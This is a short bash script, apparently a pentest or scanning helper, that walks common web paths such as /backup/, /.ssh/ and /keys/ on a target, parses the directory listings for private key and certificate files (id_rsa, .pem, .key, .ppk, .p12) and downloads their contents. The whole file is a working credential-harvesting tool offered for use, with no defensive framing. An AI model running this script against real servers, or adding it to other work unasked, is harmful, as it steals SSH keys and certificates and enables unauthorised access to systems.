#!/bin/bash
# Download credential/key files discovered in directory listings
# Usage: dirlist_credential_files.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1}"
BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')

echo "=== Credential File Download ==="
for dir in / /files/ /uploads/ /backup/ /data/ /.ssh/ /keys/; do
    BODY=$(curl -sS -L --max-time 5 "$BASE$dir" 2>/dev/null) || continue
    for pattern in id_rsa id_dsa id_ecdsa id_ed25519 "*.pem" "*.key" "*.ppk" "*.p12"; do
        FILES=$(echo "$BODY" | grep -oiP "href=\"\K[^\"]*($pattern)[^\"]*" | head -3) || true
        for f in $FILES; do
            echo "--- $dir$f ---"
            curl -sS --max-time 10 "$BASE$dir$f" 2>/dev/null | head -30 || true
            echo ""
        done
    done
done
echo "CRED_DOWNLOAD_DONE"
